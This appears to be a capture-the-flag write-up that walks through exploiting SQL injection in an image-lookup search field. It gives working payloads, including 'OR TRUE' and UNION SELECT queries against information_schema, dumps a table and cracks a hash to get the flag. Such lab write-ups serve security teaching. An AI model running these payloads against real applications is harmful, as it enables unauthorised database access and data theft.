## Step 1: Open the Website

Open the target application in your browser:

```
http://<target-ip>
```

Click the **Search Image** button to access the image lookup page.

---

## Step 2: Test for SQL Injection

In the **Image ID** input field, try a basic SQL injection payload:

```
1 OR TRUE
```

**Result:**
The application returns valid data → SQL injection is confirmed.

---

## Step 3: Enumerate Table Names

List all tables from the database:

```
1 UNION SELECT 1, table_name FROM information_schema.tables
```

**Discovered Tables:**

* db_default
* users
* guestbook
* list_images
* vote_dbs

---

## Step 4: Enumerate Column Names (list_images table)

List columns from the `list_images` table:

```
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

**Relevant Columns:**

* id
* url
* title
* comment

---

## Step 5: Dump Hidden Data

Extract the `title` and `comment` fields from the `list_images` table:

```
1 UNION SELECT title, comment FROM list_images
```

**Result:**

```
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag !
Comment: 1928e8083cf461a51303633093573c46
```

---

## Step 6: Identify & Decode the Hash

The extracted value is an MD5 hash:

```
1928e8083cf461a51303633093573c46
```

1. Decode the MD5 hash to plaintext
2. Convert the plaintext to **lowercase**
3. Hash it using **SHA-256**

---

## Step 7: Get the Flag

The resulting SHA-256 value is accepted as the final flag.
